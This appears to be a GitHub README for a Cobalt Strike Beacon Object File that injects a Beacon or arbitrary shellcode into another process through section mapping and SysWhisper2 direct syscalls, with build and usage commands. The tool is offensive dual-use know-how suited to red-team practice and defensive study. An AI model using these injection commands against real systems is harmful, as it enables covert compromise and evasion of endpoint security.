## Section Mapping Process Injection modified with SysWhisper2 (sw2-secinject): Cobalt Strike BOF

This project is for SysWhisper2 **practice purpose** and heavily relies on https://github.com/apokryptein/secinject

Failed to implement RtlCreateUserThread since syscall cannot be found using SW2


- Currently, this is only implemented for x64 processes.

### How to Make
```
git clone https://github.com/ScriptIdiot/sw2-secinject.git
cd sw2-secinject/src
make
```

### How to Use
#### Injecting Beacon
```
sw2-sec-inject PID LISTENER-NAME
```

#### Injecting Other Shellcode
```
sw2-sec-shinject PID /path/to/bin
```

### Code References
https://github.com/apokryptein/secinject

https://github.com/Sh0ckFR/InlineWhispers2





